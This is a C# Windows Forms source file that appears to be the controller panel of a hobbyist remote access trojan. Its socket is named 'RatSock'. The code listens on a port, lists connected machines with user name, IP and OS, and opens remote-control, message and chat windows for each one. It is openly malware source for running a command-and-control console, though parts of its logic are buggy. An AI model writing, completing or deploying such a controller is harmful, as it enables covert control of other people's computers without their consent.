using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Runtime.InteropServices;
using DevComponents.DotNetBar;
using DevComponents.UI;
using DevComponents.WinForms;
using WindowsFormsApplication1.Classes;
namespace WindowsFormsApplication1
{
    public partial class Main : RibbonForm
    {

        NetworkStream NS;
        StreamWriter SW;
        StreamReader SR;
        TcpListener TCPListen;
        Thread PortListen;
        Socket RatSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        List<int> ItemIndexList = new List<int>();
        public NetworkStream[] NSArray = new NetworkStream[9999];
        public StreamWriter[] SWArray = new StreamWriter[9999];
        public StreamReader[] SRArray = new StreamReader[9999];
        byte[] ConnectionBuffer = new byte[0];
        bool running = false;
        int IDNum = 1;
        int Connected = 0;
        int ItemIndex = 0;
      
        public Main()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            listViewEx1.ResetHeaderHandler();
            Application.ThreadException += new ThreadExceptionEventHandler(Derped);
        }

        void Listen(int port)
        {

            while (running)
            {

                if (Connection.AcceptConnections(port))
                {
                    Connected++;
                    Invoke(new Action(() => label1.Text = "Connected: " + Connected));
                    ListViewItem Item = new ListViewItem(IDNum.ToString(), ItemIndex);
                    ItemIndexList.Add(ItemIndex);
                    Invoke(new Action(() => listViewEx1.Items.Add(Item)));
                    Invoke(new Action(() => Item.SubItems.Add(Environment.UserName)));
                    Invoke(new Action(() => Item.SubItems.Add(Connection.GetIP(IDNum))));
                    Invoke(new Action(() => Item.SubItems.Add(Environment.OSVersion.ToString())));
                    Thread StartListener = new Thread(() => Connection.StreamListener.Start(Convert.ToInt32(Item.Text)));
                    StartListener.Start();
                    IDNum++;
                }

                foreach (int i in Connection.UpdateListView())
                {
                    MessageBox.Show(i.ToString());
                    foreach (ListViewItem Item in listViewEx1.Items)
                    {
                        if (Convert.ToInt32(Item.Text) == i)
                        {
                            MessageBox.Show(Item.Text);
                            Item.Remove();
                        }
                    }
                }
            }
        }

        void Client(ListViewItem Item, int ID)
        {
            NS = new NetworkStream(RatSock);
            IDNum++;
            SW = new StreamWriter(NS);
            SR = new StreamReader(NS);
            SWArray[ID] = SW;
            SRArray[ID] = SR;
            StringBuilder Input = new StringBuilder();
            while (running)
            {
                try
                {

                    NS.Read(ConnectionBuffer, 0, 0);
                }

                catch
                {
                    try
                    {
                        Random Rand = new Random();
                        int RandSleep = Rand.Next(1000);
                        Thread.Sleep(RandSleep);
                        NS.Close();
                        SW.Close();
                        SR.Close();
                        Input.Clear();
                        Invoke(new Action(() => listViewEx1.Items.Remove(Item)));
                        Connected--;
                        Invoke(new Action(() => label1.Text = "Connected: " + Connected));
                        break;
                    }
                    catch { }
                }
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                RatSock.Close();
                TCPListen.Stop();
            }

            catch { }
            Environment.Exit(0);
        }

        private void switchButton1_ValueChanged(object sender, EventArgs e)
        {
            if (switchButton1.Value == false)
            {
                running = false;
                IDNum = 1;
                Connected = 0;
                listViewEx1.Items.Clear();
                textBoxX1.Enabled = true;
                label1.Text = "Connected: " + Connected;
                Connection.StreamListener.StopAll();
                Connection.Disconnect();
            }

            else
            {
                //Enabled State
                //PREPARIN TO FIRE MAH LAZER
                try
                {

                    Convert.ToInt32(textBoxX1.Text);
                    textBoxX1.Enabled = false;
                    running = true;
                    PortListen = new Thread(() => Listen(Convert.ToInt32(textBoxX1.Text)));
                    PortListen.Start();
                }

                catch 
                { 
                    MessageBox.Show("Please enter a valid port","Error", 0, MessageBoxIcon.Warning);
                    switchButton1.Value = false;
                }
            }
        }

        private void buttonItem19_Click(object sender, EventArgs e)
        {
            //MESSAGE FUNCTION
            Message MessageWND = new Message();
            MessageWND.ShowDialog();
        }

        private void buttonItem34_Click(object sender, EventArgs e)
        {
            Chat Chatbox = new Chat();
            Chatbox.ShowDialog();
        }

        private void buttonItem32_Click(object sender, EventArgs e)
        {
            Remote Remote = new Remote(SRArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)], SWArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
            Remote.ShowDialog();
           
        }

       private void Derped(object Obj, ThreadExceptionEventArgs Arg)
        {
            //Do this routine when program has dun goofd.
            listViewEx1.Items.Clear();
            RatSock.Blocking = true;
        }


       
       
 




        //IGNORE THE BS BELOW ME METRO UI STUFFFF
         private void metroTabItem2_Click(object sender, EventArgs e)
        {

        }

        private void metroShell1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabItem1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPanel1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPanel2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing_1(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void metroShell1_Click_1(object sender, EventArgs e)
        {

        }

        private void metroAppButton1_Click(object sender, EventArgs e)
        {

        }




    }
}
